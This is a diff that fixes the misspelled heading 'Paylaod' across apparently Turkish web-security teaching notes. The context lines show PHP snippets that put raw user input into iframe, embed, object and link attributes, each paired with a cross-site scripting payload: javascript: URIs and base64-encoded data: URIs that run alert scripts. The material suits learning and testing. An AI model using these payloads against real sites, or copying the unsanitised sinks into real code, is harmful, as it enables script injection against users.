@@ -139,7 +139,7 @@ Web uygulamalarında güvenlik açıkları, çeşitli yollarla ortaya çıkabili
 <iframe src=\"" . $userInput . "\"></iframe>
 ```
 
-**Paylaod**
+**Payload**
 
 ```
 javascript:alert(0)
@@ -153,7 +153,7 @@ javascript:alert(0)
 <iframe src=\"" . $userInput . "\"></iframe>
 ```
 
-**Paylaod**
+**Payload**
 
 ```
 data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==
@@ -167,7 +167,7 @@ data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==
 <iframe src=\"" . $userInput . "\"></iframe>
 ```
 
-**Paylaod**
+**Payload**
 
 ```
 data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+
@@ -182,7 +182,7 @@ data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPj
 <embed src="$userInput"></embed>
 ```
 
-**Paylaod**
+**Payload**
 
 ```
 data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+
@@ -196,7 +196,7 @@ data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPj
 <embed src="$userInput"></embed>
 ```
 
-**Paylaod**
+**Payload**
 
 ```
 data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
@@ -210,7 +210,7 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
 <embed src="$userInput"></embed>
 ```
 
-**Paylaod**
+**Payload**
 
 ```
 data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
@@ -224,7 +224,7 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
 <object data=\"". $userInput . "\"></object>
 ```
 
-**Paylaod**
+**Payload**
 
 ```
 data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
@@ -239,7 +239,7 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 <a href=\"" . $userInput . "\">LINK</a>
 ```
 
-**Paylaod**
+**Payload**
 
 ```js
 javascript:alert(0);
